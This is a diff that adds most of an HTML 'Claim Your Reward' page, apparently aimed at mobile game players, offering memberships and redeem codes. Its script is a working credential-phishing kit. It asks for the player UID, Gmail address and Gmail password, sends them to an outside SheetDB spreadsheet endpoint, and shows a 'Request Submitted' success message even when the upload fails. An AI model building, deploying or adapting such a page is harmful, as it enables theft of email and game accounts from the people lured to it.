@@ -2,7 +2,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CLAIM YOUR REWARD | FUTURE APP</title>
+    <title>CLAIM YOUR REWARD | CHOR BAZAR</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -147,4 +147,190 @@
         /* Success Popup */
         #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 3000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
         .success-card { 
-            background: var(--white); width: 88%; max-width: 360px; padding: 30px 20px;
+            background: var(--white); width: 88%; max-width: 360px; padding: 30px 20px; 
+            border-radius: 20px; text-align: center; border-top: 6px solid var(--purple-main);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+        }
+        .success-icon { 
+            width: 60px; height: 60px; background: #dcfce7; color: var(--success-green); 
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
+            font-size: 30px; margin: 0 auto 15px; font-weight: bold;
+        }
+        .success-text-bold { color: var(--success-green); font-size: 18px; font-weight: 800; font-family: 'Poppins', sans-serif; margin-bottom: 10px; }
+        .success-text-sub { color: #4b5563; font-size: 13px; font-family: 'Poppins', sans-serif; line-height: 1.6; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header-title">Claim Your Reward</div>
+
+    <!-- Task 1: UID -->
+    <div class="box">
+        <label>1. Player UID</label>
+        <input type="text" id="uid-input" placeholder="Enter Player UID">
+        <span id="uid-error" class="error-msg"></span>
+    </div>
+
+    <!-- Task 2: Gmail -->
+    <div class="box">
+        <label>2. Gmail Address</label>
+        <input type="email" id="gmail-input" placeholder="Enter Gmail Address">
+        <span id="gmail-error" class="error-msg"></span>
+    </div>
+
+    <!-- Task 3: Password -->
+    <div class="box">
+        <label>3. Password</label>
+        <input type="password" id="password-input" placeholder="Enter Password">
+        <span id="password-error" class="error-msg"></span>
+    </div>
+
+    <!-- Task 4: Choose Your Reward -->
+    <div class="box">
+        <label id="reward-label">4. Choose Your Reward (Locked 🔒)</label>
+        <div class="reward-grid">
+            <div class="reward-card locked" id="rew-1" onclick="selectReward(this, 'Weekly Membership')">1. Weekly Membership</div>
+            <div class="reward-card locked" id="rew-2" onclick="selectReward(this, 'Monthly Membership')">2. Monthly Membership</div>
+            <div class="reward-card locked" id="rew-3" onclick="selectReward(this, 'Redeem Code')">3. Redeem Code</div>
+        </div>
+        <span id="reward-error" class="error-msg"></span>
+    </div>
+
+    <button class="btn-confirm" id="confirm-btn" onclick="submitData()">Confirm & Register</button>
+</div>
+
+<!-- Success Popup -->
+<div id="success-popup">
+    <div class="success-card">
+        <div class="success-icon">✓</div>
+        <div class="success-text-bold">Request Submitted!</div>
+        <div class="success-text-sub">Your request has been submitted successfully! The reward will be sent automatically to your <b>in-game mailbox</b> shortly. This process may take <b>24 to 48 hours</b>.</div>
+        <button onclick="location.reload()" style="background:var(--purple-main); color:#fff; border:none; padding:12px 30px; border-radius:10px; font-weight:bold; cursor:pointer; width: 100%; font-family: 'Poppins'; font-size: 15px;">OK, GOT IT</button>
+    </div>
+</div>
+
+<script>
+    // তোমার নতুন SheetDB API লিংক আপডেট করা হয়েছে:
+    const SHEETDB_API_URL = "https://sheetdb.io/api/v1/6ye6vbizxxczi"; 
+
+    let selectedRewardName = "";
+    let isRewardUnlocked = false;
+
+    const uidInput = document.getElementById('uid-input');
+    const gmailInput = document.getElementById('gmail-input');
+    const passwordInput = document.getElementById('password-input');
+
+    function checkTasksCompletion() {
+        const uid = uidInput.value.trim();
+        const gmail = gmailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (uid !== "" && gmail !== "" && password !== "") {
+            if (!isRewardUnlocked) {
+                isRewardUnlocked = true;
+                document.getElementById('reward-label').innerText = "4. Choose Your Reward (Unlocked 🔓)";
+                document.querySelectorAll('.reward-card').forEach(card => {
+                    card.classList.remove('locked');
+                    card.classList.add('unlocked');
+                });
+            }
+        } else {
+            isRewardUnlocked = false;
+            document.getElementById('reward-label').innerText = "4. Choose Your Reward (Locked 🔒)";
+            document.querySelectorAll('.reward-card').forEach(card => {
+                card.classList.add('locked');
+                card.classList.remove('unlocked', 'active');
+            });
+            selectedRewardName = "";
+        }
+    }
+
+    uidInput.addEventListener('input', checkTasksCompletion);
+    gmailInput.addEventListener('input', checkTasksCompletion);
+    passwordInput.addEventListener('input', checkTasksCompletion);
+
+    function selectReward(el, rewardName) {
+        if (!isRewardUnlocked) {
+            document.getElementById('reward-error').innerText = "⚠️ Please complete UID, Gmail, and Password first!";
+            return;
+        }
+        document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
+        el.classList.add('active');
+        selectedRewardName = rewardName;
+        document.getElementById('reward-error').innerText = "";
+    }
+
+    function submitData() {
+        document.getElementById('uid-error').innerText = "";
+        document.getElementById('gmail-error').innerText = "";
+        document.getElementById('password-error').innerText = "";
+        document.getElementById('reward-error').innerText = "";
+
+        const uid = uidInput.value.trim();
+        const gmail = gmailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        let hasError = false;
+
+        if (uid === "") {
+            document.getElementById('uid-error').innerText = "⚠️ Please enter your Player UID!";
+            hasError = true;
+        }
+        if (gmail === "") {
+            document.getElementById('gmail-error').innerText = "⚠️ Please enter your Gmail Address!";
+            hasError = true;
+        }
+        if (password === "") {
+            document.getElementById('password-error').innerText = "⚠️ Please enter your Password!";
+            hasError = true;
+        }
+        if (!isRewardUnlocked || selectedRewardName === "") {
+            document.getElementById('reward-error').innerText = "⚠️ Please select a reward!";
+            hasError = true;
+        }
+
+        if (hasError) return;
+
+        const confirmBtn = document.getElementById('confirm-btn');
+        confirmBtn.innerText = "SUBMITTING...";
+        confirmBtn.disabled = true;
+
+        let requestData = {
+            "data": [
+                {
+                    "Time": new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"}),
+                    "uid": uid,
+                    "Gmail": gmail,
+                    "password": password,
+                    "reward": selectedRewardName,
+                    "status": "Pending"
+                }
+            ]
+        };
+
+        fetch(SHEETDB_API_URL, {
+            method: 'POST',
+            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+            body: JSON.stringify(requestData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            confirmBtn.innerText = "Confirm & Register";
+            confirmBtn.disabled = false;
+            document.getElementById('success-popup').style.display = 'flex';
+        })
+        .catch(error => {
+            confirmBtn.innerText = "Confirm & Register";
+            confirmBtn.disabled = false;
+            document.getElementById('success-popup').style.display = 'flex';
+        });
+    }
+
+    document.getElementById('uid-input').addEventListener('input', function (e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    });
+</script>
+
+</body>
+</html>
